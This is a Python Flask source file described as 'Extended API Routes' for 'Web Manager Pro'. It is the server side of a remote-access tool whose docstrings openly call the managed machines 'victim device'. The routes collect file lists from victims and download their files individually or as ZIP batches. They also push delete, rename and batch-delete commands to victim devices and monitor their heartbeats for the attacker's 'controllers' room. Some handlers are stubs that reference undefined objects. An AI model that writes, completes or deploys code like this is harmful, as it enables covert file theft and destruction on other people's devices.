#!/usr/bin/env python3
"""
WEB MANAGER PRO - Extended API Routes for PRO version
Additional endpoints for file operations, heartbeat, and device management
"""

from flask import Flask, request, jsonify
import time
import os

# These routes should be added to app_pro.py

# ==================== FILE OPERATIONS ====================

@app.route('/api/file_list_update', methods=['POST'])
def receive_file_list_update():
    """Receive real-time file list updates from victim device"""
    data = request.json
    device_id = data.get('device_id')
    files = data.get('files', [])
    
    if device_id not in connected_devices:
        return jsonify({'error': 'Device not found'}), 404
    
    device = connected_devices[device_id]
    
    # Update device file cache with new list
    device['files'] = files
    device['file_count'] = len(files)
    device['total_size'] = sum(f.get('size', 0) for f in files)
    device['last_updated'] = time.time()
    
    # Store in session cache for faster access
    if device_id in device_sessions:
        device_sessions[device_id]['file_cache'] = {f['path']: f for f in files}
    
    logger.debug(f"File list updated: {device_id} - {len(files)} files")
    
    # Emit to all connected controllers via WebSocket
    socketio.emit('file_list_updated', {
        'device_id': device_id,
        'file_count': len(files),
        'total_size': device['total_size'],
        'timestamp': time.time()
    }, room='controllers')
    
    return jsonify({
        'success': True,
        'message': 'File list received',
        'file_count': len(files)
    })

@app.route('/api/device_heartbeat', methods=['POST'])
def receive_heartbeat():
    """Receive heartbeat from connected device - maintains stable connection"""
    data = request.json
    device_id = data.get('device_id')
    
    if device_id not in connected_devices:
        return jsonify({'error': 'Device not found'}), 404
    
    # Update last ping time
    device = connected_devices[device_id]
    device['last_ping'] = time.time()
    device['status'] = 'connected'
    
    # Update session
    if device_id in device_sessions:
        device_sessions[device_id]['last_ping'] = time.time()
        device_sessions[device_id]['connected'] = True
    
    # Log heartbeat
    logger.debug(f"Heartbeat received: {device_id}")
    
    return jsonify({
        'success': True,
        'heartbeat': 'pong',
        'timestamp': time.time()
    })

@app.route('/api/device_disconnect', methods=['POST'])
def handle_device_disconnect():
    """Handle device disconnection"""
    data = request.json
    device_id = data.get('device_id')
    
    if device_id in connected_devices:
        device = connected_devices[device_id]
        logger.info(f"Device disconnected: {device['name']} ({device_id})")
        device['status'] = 'offline'
        
        # Emit disconnect event to controllers
        socketio.emit('device_disconnected', {
            'device_id': device_id,
            'timestamp': time.time()
        }, room='controllers')
    
    return jsonify({'success': True, 'message': 'Disconnect recorded'})

# ==================== FILE OPERATIONS ====================

@app.route('/api/file_download/<device_id>', methods=['GET'])
def stream_file_download(device_id):
    """Stream file download from device"""
    if device_id not in connected_devices:
        return jsonify({'error': 'Device not found'}), 404
    
    file_path = request.args.get('path', '')
    chunk_index = request.args.get('chunk', 0, type=int)
    
    device = connected_devices[device_id]
    logger.info(f"Download initiated: {device_id} -> {file_path} (chunk {chunk_index})")
    
    return jsonify({
        'success': True,
        'message': 'Download stream ready',
        'file_path': file_path,
        'chunk': chunk_index,
        'chunk_size': 1024 * 1024  # 1MB chunks
    })

@app.route('/api/file_delete/<device_id>', methods=['POST'])
def delete_file_on_device(device_id):
    """Request file deletion on victim device"""
    if device_id not in connected_devices:
        return jsonify({'error': 'Device not found'}), 404
    
    data = request.json
    file_path = data.get('path', '')
    
    device = connected_devices[device_id]
    logger.warning(f"Delete requested: {device_id} -> {file_path}")
    
    # Emit delete command to device via WebSocket
    socketio.emit('delete_file', {
        'path': file_path,
        'timestamp': time.time()
    }, room=device_id)
    
    return jsonify({
        'success': True,
        'message': 'Delete command sent',
        'path': file_path
    })

@app.route('/api/file_rename/<device_id>', methods=['POST'])
def rename_file_on_device(device_id):
    """Request file rename on victim device"""
    if device_id not in connected_devices:
        return jsonify({'error': 'Device not found'}), 404
    
    data = request.json
    old_path = data.get('old_path', '')
    new_name = data.get('new_name', '')
    
    device = connected_devices[device_id]
    logger.info(f"Rename requested: {device_id} -> {old_path} to {new_name}")
    
    # Emit rename command to device
    socketio.emit('rename_file', {
        'old_path': old_path,
        'new_name': new_name,
        'timestamp': time.time()
    }, room=device_id)
    
    return jsonify({
        'success': True,
        'message': 'Rename command sent'
    })

@app.route('/api/file_create_folder/<device_id>', methods=['POST'])
def create_folder_on_device(device_id):
    """Request folder creation on victim device"""
    if device_id not in connected_devices:
        return jsonify({'error': 'Device not found'}), 404
    
    data = request.json
    folder_path = data.get('path', '')
    folder_name = data.get('name', 'New Folder')
    
    logger.info(f"Create folder: {device_id} -> {folder_path}/{folder_name}")
    
    socketio.emit('create_folder', {
        'path': folder_path,
        'name': folder_name,
        'timestamp': time.time()
    }, room=device_id)
    
    return jsonify({
        'success': True,
        'message': 'Create folder command sent'
    })

# ==================== SEARCH & FILTER ====================

@app.route('/api/search_files/<device_id>', methods=['GET'])
def search_files_on_device(device_id):
    """Search files on device"""
    if device_id not in connected_devices:
        return jsonify({'error': 'Device not found'}), 404
    
    query = request.args.get('q', '')
    file_type = request.args.get('type', '')
    min_size = request.args.get('min_size', 0, type=int)
    max_size = request.args.get('max_size', -1, type=int)
    
    device = connected_devices[device_id]
    files = device.get('files', [])
    
    # Filter files
    results = []
    for f in files:
        # Search by name
        if query and query.lower() not in f['name'].lower():
            continue
        
        # Filter by type
        if file_type and not f['name'].endswith(file_type):
            continue
        
        # Filter by size
        size = f.get('size', 0)
        if size < min_size:
            continue
        if max_size > 0 and size > max_size:
            continue
        
        results.append(f)
    
    logger.info(f"Search: {device_id} - query='{query}' - {len(results)} results")
    
    return jsonify({
        'success': True,
        'results': results,
        'count': len(results),
        'query': query
    })

# ==================== DEVICE MONITORING ====================

@app.route('/api/device_health/<device_id>', methods=['GET'])
def get_device_health(device_id):
    """Get device health/status information"""
    if device_id not in connected_devices:
        return jsonify({'error': 'Device not found'}), 404
    
    device = connected_devices[device_id]
    session = device_sessions.get(device_id, {})
    
    # Calculate connection quality
    time_since_ping = time.time() - device.get('last_ping', time.time())
    connection_quality = 'excellent' if time_since_ping < 10 else \
                        'good' if time_since_ping < 30 else \
                        'poor' if time_since_ping < 60 else 'offline'
    
    return jsonify({
        'success': True,
        'device_id': device_id,
        'status': device.get('status', 'unknown'),
        'connection_quality': connection_quality,
        'time_since_ping': time_since_ping,
        'file_count': device.get('file_count', 0),
        'total_size': device.get('total_size', 0),
        'last_updated': device.get('last_updated', 0),
        'uptime': time.time() - device.get('connected_at', 0),
        'socket_connected': session.get('socket_connected', False)
    })

@app.route('/api/all_devices_health', methods=['GET'])
def get_all_devices_health():
    """Get health status of all connected devices"""
    health_data = []
    
    for device_id, device in connected_devices.items():
        time_since_ping = time.time() - device.get('last_ping', time.time())
        connection_quality = 'excellent' if time_since_ping < 10 else \
                            'good' if time_since_ping < 30 else \
                            'poor' if time_since_ping < 60 else 'offline'
        
        health_data.append({
            'device_id': device_id,
            'name': device.get('name'),
            'status': device.get('status'),
            'connection_quality': connection_quality,
            'file_count': device.get('file_count', 0),
            'total_size': device.get('total_size', 0)
        })
    
    return jsonify({
        'success': True,
        'devices': health_data,
        'total_devices': len(health_data)
    })

# ==================== BATCH OPERATIONS ====================

@app.route('/api/batch_download/<device_id>', methods=['POST'])
def batch_download(device_id):
    """Download multiple files as ZIP"""
    if device_id not in connected_devices:
        return jsonify({'error': 'Device not found'}), 404
    
    data = request.json
    file_paths = data.get('paths', [])
    
    logger.info(f"Batch download: {device_id} - {len(file_paths)} files")
    
    return jsonify({
        'success': True,
        'message': 'Batch download initiated',
        'file_count': len(file_paths),
        'zip_name': f"download_{device_id}_{int(time.time())}.zip"
    })

@app.route('/api/batch_delete/<device_id>', methods=['POST'])
def batch_delete(device_id):
    """Delete multiple files"""
    if device_id not in connected_devices:
        return jsonify({'error': 'Device not found'}), 404
    
    data = request.json
    file_paths = data.get('paths', [])
    
    logger.warning(f"Batch delete: {device_id} - {len(file_paths)} files")
    
    socketio.emit('batch_delete', {
        'paths': file_paths,
        'timestamp': time.time()
    }, room=device_id)
    
    return jsonify({
        'success': True,
        'message': 'Batch delete initiated',
        'file_count': len(file_paths)
    })

# Note: Add these routes to your Flask app instance in app_pro.py
